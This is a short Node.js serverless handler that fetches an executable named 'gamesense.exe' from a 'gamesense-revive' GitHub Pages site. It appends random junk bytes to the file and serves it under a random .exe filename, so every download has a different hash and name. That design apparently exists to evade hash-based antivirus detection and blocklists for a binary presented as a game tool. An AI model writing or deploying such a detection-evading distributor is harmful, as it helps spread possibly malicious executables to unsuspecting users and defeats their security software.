const https = require('https');

module.exports = async (req, res) => {
    const fileUrl = 'https://gamesense-revive.github.io/gamesense.exe';

    res.setHeader('Access-Control-Allow-Origin', '*');

    https.get(fileUrl, (downloadStream) => {
        if (downloadStream.statusCode !== 200) {
            return res.status(500).send('Error');
        }

        let chunks = [];
        downloadStream.on('data', (chunk) => chunks.push(chunk));
        
        downloadStream.on('end', () => {
            let buffer = Buffer.concat(chunks);

            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let randomName = '';
            for (let i = 0; i < 12; i++) {
                randomName += chars.charAt(Math.floor(Math.random() * chars.length));
            }

            const junkSize = Math.floor(Math.random() * 90) + 10;
            const junkBytes = Buffer.alloc(junkSize);
            for (let i = 0; i < junkSize; i++) {
                junkBytes[i] = Math.floor(Math.random() * 256);
            }
            
            const modifiedBuffer = Buffer.concat([buffer, junkBytes]);

            res.setHeader('Content-Type', 'application/octet-stream');
            res.setHeader('Content-Disposition', `attachment; filename="${randomName}.exe"`);
            res.status(200).send(modifiedBuffer);
        });

    }).on('error', (err) => {
        res.status(500).send('Error: ' + err.message);
    });
};